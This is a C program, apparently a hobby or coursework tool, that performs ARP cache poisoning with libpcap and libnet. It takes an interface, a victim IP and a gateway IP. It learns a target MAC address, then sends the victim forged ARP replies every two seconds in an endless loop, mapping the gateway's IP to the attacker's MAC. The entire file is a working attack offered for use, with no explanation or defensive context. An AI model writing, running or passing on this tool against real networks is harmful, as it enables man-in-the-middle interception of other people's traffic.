#include <pcap.h>
#include <memory.h>
#include <libnet.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <time.h>
#include "hexdump.h"
#include "mymacip.h"

/* ARP Header, (assuming Ethernet+IPv4)            */ 
#define ARP_ETHERTYPE 0x0608
#define ARP_ETHER 0x0100	/* Ethernet 10Mbps 		   */
#define ARP_IP 0x0008		/* IPv4 				   */
#define ARP_HLEN 0x6		/* Mac addr length		   */	
#define ARP_PLEN 0x4		/* IPv4 addr length		   */
#define ARP_REQUEST 0x0100  /* req to resolve address */
#define ARP_REPLY 0x0200 	/* resp to previous request */
#define PACKET_SIZE 42		/* ethernet+arp = 12+28	   */
typedef struct arphdr { 
    u_int16_t htype;    /* Hardware Type           */ 
    u_int16_t ptype;    /* Protocol Type           */ 
    u_char hlen;        /* Hardware Address Length */ 
    u_char plen;        /* Protocol Address Length */ 
    u_int16_t oper;     /* Operation Code          */ 
    u_char sha[6];      /* victim hardware address */ 
    u_char spa[4];      /* victim IP address       */ 
    u_char tha[6];      /* gateway hardware address */ 
    u_char tpa[4];      /* gateway IP address       */ 
}arphdr_t; 

u_char tmp[PACKET_SIZE];

void make_arp_packet(uint8_t *victim_mac, in_addr_t victim_ip, uint8_t *gateway_mac, in_addr_t gateway_ip, int oper, int check){
	memset(tmp, 0, PACKET_SIZE);
	
	libnet_ethernet_hdr *eth_h = (libnet_ethernet_hdr *) tmp;
	arphdr_t *arp_h = (arphdr_t *) (tmp+14);
	
	memcpy(eth_h->ether_dhost, gateway_mac, 6);
	memcpy(eth_h->ether_shost, victim_mac, 6);
	eth_h->ether_type = ARP_ETHERTYPE;

	arp_h->htype = ARP_ETHER;
	arp_h->ptype = ARP_IP;
	arp_h->hlen = ARP_HLEN;
	arp_h->plen = ARP_PLEN;
	arp_h->oper = oper;
	memcpy(arp_h->sha, victim_mac, 6);
	memcpy(arp_h->spa, &(victim_ip), 4);
	if (check)
		memcpy(arp_h->tha, gateway_mac, 6);
	memcpy(arp_h->tpa, &(gateway_ip), 4);
	hexdump(tmp, 42);
}

int main(int argc, char *argv[])
{
    const uint8_t *packet;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct pcap_pkthdr *header;
    pcap_t *handle;
    uint8_t res;
	uint8_t mymac[6];
	uint8_t victim_mac[6];
	int i;

	libnet_ethernet_hdr *eth_h;
	arphdr_t *arp_h;
	int eth_len = sizeof(*eth_h);

	struct in_addr my_ip;
	struct in_addr gateway_ip;
	struct in_addr victim_ip;

	char tmpIP[16];
	char tmppacket[42];

    if (argc != 4){
		printf("[!] Usage : %s [interface] [victim ip] [gateway ip]\n", argv[0]);
        return 0;
    }

    if((handle = pcap_open_live(argv[1], 2048, 1, 1024, errbuf)) == NULL){
        printf("[!] Device open Error!!!\n");
        perror(errbuf);
        exit(0);;
    }

	inet_pton(AF_INET, argv[2], &victim_ip.s_addr);
	inet_pton(AF_INET, argv[3], &gateway_ip.s_addr);
	get_mac(argv[1], (uint8_t*)mymac);
	my_ip = get_ip(argv[1]);

	printf("MY MAC -> ");
    for(i=0; i<6;i++)
        printf("%02X%s", mymac[i], (i==5 ? "\n" : ":"));

	sprintf(tmpIP, "%s", inet_ntoa(my_ip));
	printf("MY IP  -> %s\n", tmpIP);
	memset(tmpIP, 0, sizeof(inet_ntoa(my_ip)));

	sprintf(tmpIP, "%s", inet_ntoa(victim_ip));
	printf("victim IP  -> %s\n", tmpIP);
	memset(tmpIP, 0, sizeof(inet_ntoa(victim_ip)));

	sprintf(tmpIP, "%s", inet_ntoa(gateway_ip));
	printf("gateway IP  -> %s\n", tmpIP);
	
	uint8_t broadcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

	make_arp_packet(mymac, my_ip.s_addr, broadcast, gateway_ip.s_addr, ARP_REQUEST, 0);
	if (pcap_sendpacket(handle, (u_char *)tmp, PACKET_SIZE) != 0)
    {
        fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(handle));
        return -1;
    }
    
	if((handle = pcap_open_live(argv[1], 2048, 1, 1024, errbuf)) == NULL){
        printf("[!] Device open Error!!!\n");
        perror(errbuf);
        exit(0);;
    }
    while(1){
        res = pcap_next_ex(handle, &header, &packet);
        if (res == 0 || packet == NULL)
            continue;
        if (res == -1 || res == -2){
            printf("[!] EXIT process\n");
            break;
        }

		eth_h = (libnet_ethernet_hdr *) packet;
		arp_h = (arphdr_t *) (packet+eth_len);
		if (ntohs(eth_h->ether_type) == ETHERTYPE_ARP){
			if (memcmp(eth_h->ether_dhost, mymac, 6) == 0){
				hexdump(packet, 42);
				memcpy(victim_mac, eth_h->ether_shost, 6);
				break;
			}
		}
    }
	
	while(1){
		make_arp_packet(mymac, gateway_ip.s_addr, victim_mac, victim_ip.s_addr, ARP_REPLY, 1);
		if (pcap_sendpacket(handle, (u_char *)tmp, PACKET_SIZE) != 0)
		{
			fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(handle));
			return -1;
		}
		sleep(2);
	}
    return 0;
}



